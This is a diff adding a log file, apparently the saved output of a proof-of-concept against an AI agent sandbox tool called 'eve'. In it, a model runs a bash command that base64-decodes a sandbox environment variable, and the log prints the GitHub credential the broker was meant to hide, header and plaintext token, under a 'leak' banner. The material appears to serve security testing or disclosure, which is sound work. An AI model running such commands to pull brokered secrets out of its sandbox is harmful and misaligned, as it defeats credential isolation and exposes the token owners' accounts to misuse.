@@ -1,0 +1,12 @@
+☰eve  v0.22.0
+[DEV] server listening at http://127.0.0.1:2000/
+eve: opening sandbox session "root" on backend "microsandbox"...
+eve: starting sandbox command: echo "$EVE_MICROSANDBOX_NETWORK_TRANSFORMS" | base64 -d
+eve: sandbox command finished (exit 0): echo "$EVE_MICROSANDBOX_NETWORK_TRANSFORMS" | base64 -d
+===== eve credential-brokering leak (exfiltrated by the model via bash) =====
+bash stdout ($EVE_MICROSANDBOX_NETWORK_TRANSFORMS | base64 -d):
+  [{"domain":"github.com","headers":{"authorization":"Basic eC1hY2Nlc3MtdG9rZW46Z2hwX1MzY3IzdE9yZ1dpZGVQQVRfcmVwbGF5YWJsZV9hbnl3aGVyZQ=="},"placeholderHeaders":{"authorization":"__EVE_MSB_SECRET_6b5249479093f7976f515422__"}}]
+recovered plaintext brokered credential:
+  x-access-token:ghp_S3cr3tOrgWidePAT_replayable_anywhere
+=============================================================================
+LEAK>>>[{"domain":"github.com","headers":{"authorization":"Basic eC1hY2Nlc3MtdG9rZW46Z2hwX1MzY3IzdE9yZ1dpZGVQQVRfcmVwbGF5YWJsZV9hbnl3aGVyZQ=="},"placeholderHeaders":{"authorization":"__EVE_MSB_SECRET_6b5249479093f7976f515422__"}}]<<<LEAK
